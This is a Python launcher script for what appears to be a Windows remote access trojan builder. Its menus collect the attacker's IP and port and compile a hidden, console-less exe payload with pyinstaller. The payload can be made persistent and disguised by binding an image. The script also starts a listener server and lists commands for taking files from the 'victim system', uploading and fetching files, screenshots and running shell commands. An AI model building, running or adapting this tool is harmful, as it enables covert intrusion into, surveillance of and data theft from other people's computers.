import subprocess
import sys
import os
import time
import imp
import threading

def clean():
	if os.name == 'nt':
		_ = os.system('cls')
	else:
		_ = os.system('clear')

def banner():
	clean()
	print(
	'''
	$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
	$      ______        ____                                                                                  $
	$     |      |      |    |                             |    |                                              $
	$     |______|      |____|              __       _     |    |         _   __        __                     $
	$     \       \     |      /\  \ /  |  |  | /\  | \ -- | /\ | o |\ | | \ |  | |  | |__                     $
	$      \_______\    |     /--\  |   |_ |__|/--\ |_/    |/  \| | | \| |_/ |__| |/\|  __|                    $
	$                                                                                       --- script-beast   $
	$                                                                                                          $
	$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
	''')
st = False
def lodng(modu , t = 3) :
	i = 0
	if t == 0:
		ru = True
	else :
		ru =  False
	while i < t or ru:
		sys.stdout.write('\r ' + str(modu) + '...  |')
		time.sleep(0.1)
		sys.stdout.write('\r ' + str(modu) + '...  /')
		time.sleep(0.1)
		sys.stdout.write('\r ' + str(modu) + '...  -')
		time.sleep(0.1)
		sys.stdout.write('\r ' + str(modu) + '...  \\')
		time.sleep(0.1)
		i = i + 1
		if st == True :
			ru = False
			break

pack = "socket subprocess json time os shutil sys base64 requests platform getpass mss threading"

def checking() :
	banner()
	moduflag = 0
	if sys.version_info < (3,7,0) :
		sys.exit("Needed python version more than 3.7")
	print(" Checking Modules.... \n\n")
	for pac in pack.split() :
		lodng(pac)
		found = " OK\n"
		try:
			imp.find_module(str(pac))
		except :
			found = " Not Found\n"
			moduflag = moduflag + 1
		sys.stdout.write('\r' + str(pac) + '...  ' + str(found))
	if (moduflag > 0) :
		sys.exit(" Some module not found please install it ...")

def isIPv4(s):
	try:
		return str(int(s)) == s and 0 <= int(s) <= 255
	except: 
		return False

def crepay():
	import shutil
	flag = 1
	while (flag > 0):
		banner()
		ipno = "1270.0.0.1"
		pono = 320
		pres = 'n'
		imop = 'n'
		imna = "image.jpg"
		ipno = str(input(" Enter your (LHOST) ip                       :- "))
		pono = str(input(" Enter port no.                              :- "))
		pres = str(input(" Create persistent [y/n]     (Default - n)   :- "))
		imop = str(input(" Bind image to display [y/n] (Default - n)   :- "))
		if imop == 'y' or imop == 'Y' :
			imna = str(input(" Enter image name(With extension)            :-"))
		if (ipno.count(".") == 3 and all(isIPv4(i) for i in ipno.split("."))) and pono.isnumeric() and (pres == 'y' or pres == 'Y' or pres == 'n' or pres == 'N') and (imop == 'Y' or imop == 'y' or imop == 'n' or imop == 'N' and ((imop == 'y' or imop == 'Y') and os.path.exists(location))):
			flag = 0
		else :
			print (" Absurd Values ")
			time.sleep(5)
	file1 = open("delc.py", "a")
	file1.write("\nipnod = '" + ipno + "'\nponod = " + str(pono) + "\npresd = '" + str(pres)+"'")
	if imop == 'y' or imop == 'Y' :
		file1.write("\nimopd = '" + str(imop) + "'\nimnad = '" + str(imna) + "'")
	else :
		file1.write("\nimopd = '" + str(imop) + "'")
	file1.close()
	print (" Creating payload : ")
	time.sleep(5)
	if imop == 'y' or imop == 'Y' :
		com = "pyinstaller --add-data "+ str(imna) +";. --onefile --noconsole --icon im.ico client.py"
	else : 
		com = "pyinstaller --onefile --noconsole --icon im.ico client.py"
	try :
		t1 = threading.Thread(target=lodng, args=(" Loading.." ,40,))
		t1.start()
#		subprocess.run(str(com))
		subprocess.run( str(com), stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
		shutil.move('dist\client.exe', os.getcwd())
		shutil.rmtree('__pycache__')
		shutil.rmtree('build')
		shutil.rmtree('dist')
		os.remove('client.spec')
		os.remove('delc.py')
		t1.join()
		sys.stdout.write('\r                   ')
		print("\n\n Payload created")
		time.sleep(5)
	except :
		sys.exit(" Uanble to make payload")

def staser() :
	flag = 1
	while (flag > 0):
		banner()
		ipno = "1270.0.0.1"
		pono = 320
		ipno = str(input(" Enter your (Attacker) ip                    :- "))
		pono = str(input(" Enter port no.                              :- "))
		if (ipno.count(".") == 3 and all(isIPv4(i) for i in ipno.split("."))) and pono.isnumeric():
			flag = 0
		else :
			print (" Absurd Values ")
			time.sleep(5)
	try :
		subprocess.run("python server.py " + str(ipno) + " "+ str(pono))
	except :
		sys.exit(" Unable to Start Server")

def comm() :
	print (
	"""
	. cd -> Change thr directory 
		eg : cd xyz , cd .. , etc 
	. download -> Download items from victim system to your system
		eg : download xyz.txt , download abc.mp4 , etc
	. upload -> Upload items from your system to victim system
		eg : upload xyz.txt , upload abc.mp4 , etc
	. get -> Download items from internet to victim system
		eg : get http://abcdef.com/xyz.txt , get http://zxcvb.com/abc.mp4 , etc
	. start -> Start program on victim system
		eg : start notepad , start regedit , etc
	. sysinfo -> To get victim system details : Operating System , Computer Name , Username , Release Version , Processor Architecture 
		eg : sysinfo
	. screenshot -> To get screenshot victim system
		eg : screenshot
	. check priviliges -> Check priviliges of the payload on victim system
		eg: check priviliges
	
	Note : All the windows command promt (cmd) works 
		eg : ls , dir , rm , mkdir , etc
	\n\n
	 1. Back to main menu
	 2. Exit
	""")
	op = str(input(" Enter >> "))
	if op == '2' :
		sys.exit(" Exiting ... ")

def hel() :
	print (
	'''
	It is for windows.
	
	1. Create a payload  :
		It will create payload in exe / jpg for windows.
			Enter your ip                               :-  IP of attacker system.
			Enter port no.                              :-  Port number for connection.
			Create persistent [y/n]     (Default - n)   :-  It will create persistance. Payload will satrt running 
			                                                every time victim reastart the system. Default set to
									no. Type y for activate.
			Bind image to display [y/n] (Default - n)   :- 	It will bind an image. When victim open the payload it 
			                                                open image.Default set to no. Type y for activate.
				Enter image name(With extension)    :-  Image that u want to bind.
	
	2. Start server :
		It will start server.
			Enter your (Attacker) ip                    :-  IP of attacker system.
			Enter port no.                              :-  Port number at for connection.
	
	3. Commands :
		It will shows commands availabe .
	
	If want change the icon of payload u can replace im.ico with your desired icon
	
	Please DO NOT DELETE anything.
	\n\n
	1. Back to main menu
	2. Exit
	''')
	op = str(input(" Enter >> "))
	if op == '2' :
		sys.exit(" Exiting ... ")

def menu():
	ch = '5'
	while True :
		banner()
		print (" Main Menu :- \n\n     1. Create a payload  \n     2. Start server \n     3. Commands \n     4. Help \n     5. Exit")
		ch = str(input("\n\n Enter >>> "))
		if ch == '1' :
			crepay()
		elif ch == '2' :
			staser()
		elif ch == '3' :
			comm()
		elif ch == '4' :
			hel()
		else :
			sys.exit(" Exiting .....")

if __name__ == '__main__':
	checking()
	menu()
